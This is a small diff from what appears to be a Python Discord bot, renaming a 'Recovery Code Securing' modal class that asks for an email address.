@@ -4,7 +4,7 @@ import discord
 from securing.recovery_secure import recovery_secure
 from ui.buttons.account_details import accountInfo
 
-class recoveryModal(ui.Modal):
+class recoveryAuthModal(ui.Modal):
     def __init__(self):
         super().__init__(title="Recovery Code Securing")
         self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
